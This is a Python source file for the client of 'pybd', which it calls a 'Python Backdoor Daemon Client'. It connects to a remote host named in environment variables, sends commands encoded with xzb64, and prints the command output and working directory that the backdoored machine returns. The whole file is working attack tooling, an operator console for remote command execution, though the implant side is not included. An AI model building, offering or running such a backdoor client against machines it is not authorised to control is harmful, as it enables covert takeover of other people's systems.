"""Copyright (C) 2020 Lucie Cupcakes <lucie_linux [at] protonmail.com>
This file is part of pybd <https://gitlab.com/lucie_cupcakes/pybd>.
pybd is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation; either version 3, or (at your option) any later
version.
pybd is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or
FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License
for more details.
You should have received a copy of the GNU General Public License
along with pybd; see the file LICENSE.  If not see <http://www.gnu.org/licenses/>."""

import sys, os, socket
from xzb64 import xzb64_encode, xzb64_decode

def client_main(rhost,rport=6969,buffsize=4096,encoding='utf-8'):
    read_input=True
    first_cmd=True
    cmd=''
    sv_rc=-1
    sv_cwd=''
    s=socket.socket()
    s.connect((rhost, rport))
    while read_input:
        prompt=f'{sv_cwd}\n[{sv_rc}] %'
        if first_cmd==False:            
            print(prompt, end=' ')
            cmd=str(input()).strip()
            if cmd.lower()=='':
                cmd='sv_ping'
        else:
            cmd='sv_greet'
            first_cmd=False
        s.send(xzb64_encode(cmd).encode(encoding))
        res=s.recv(buffsize).decode(encoding).split('%') #rc%cmd_out_xzb64%cwd
        if len(res)!=3:
            print('Malformed response')
            exit()
        srv_rc=res[0]
        cmd_out=xzb64_decode(res[1])
        srv_cwd=res[2]
        print(cmd_out)
        if cmd.lower()=='exit':
            read_input=False
    s.close()

if __name__ == '__main__':
    print('pydbcli - Python Backdoor Daemon Client.')
    print('Forever beta software. Use on production on your own risk!\n')
    print('This software is Free software - released under the GPLv3 License.')
    print('Read the LICENSE file. Or go visit https://www.gnu.org/licenses/gpl-3.0.html\n')
    client_main(rhost=os.environ['rhost'],rport=int(os.environ['rport']))
